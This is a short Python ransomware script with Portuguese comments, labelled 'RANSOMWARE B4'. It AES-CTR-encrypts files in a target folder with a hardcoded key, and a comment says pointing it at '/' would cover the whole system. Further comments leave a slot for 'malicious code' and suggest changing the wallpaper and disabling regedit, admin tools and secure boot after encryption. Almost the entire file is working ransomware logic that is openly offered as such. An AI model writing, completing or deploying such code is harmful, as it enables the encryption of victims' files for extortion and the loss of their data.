#!/usr/bin/python3
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discover
import Crypter

#------------------
# a senha pode ter os seguintes tamanhos 
# 128/192/256 -
# senha de 32 caracteres
#------------------

HARDCODED_KEY = 'bot4BypassYourAllServersInSystem'

def get_parser():
    parser = argparse.ArgumentParser(description="bot4Crypter")
    
    parser.add_argument("-d", "--decrypt", help="decripta os arquivos [default: no]", action="store_true")

    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args["decrypt"]

    if decrypt:
        print(""" 
            RANSOMWARE B4
            ----------------------------------
            DECRYPT KEY = '{}'
            """.format(HARDCODED_KEY))
        key = input("Digite a senha > ")
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY
            

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt
    
    init_path = os.path.abspath(os.path.join(os.getcwd(), "files"))
    start_dirs = [init_path] # passar '/' para percorrer todo o sistema

    for currentDIr in start_dirs:
        for filename in Discover.discover(currentDIr):
            Crypter.change_files(filename, cryptFn)
    
    #sobreescreve a chave na memoria
    for _ in range(100):
        pass 
    
    if not decrypt:
        #codigo malicioso aqui
        pass 
    
    #apos a encriptação, pode-se alterar o wallpaper
    #alterar os icones, desativar o regedit, admin, bios secure boot, etc

if __name__ == "__main__":
    main()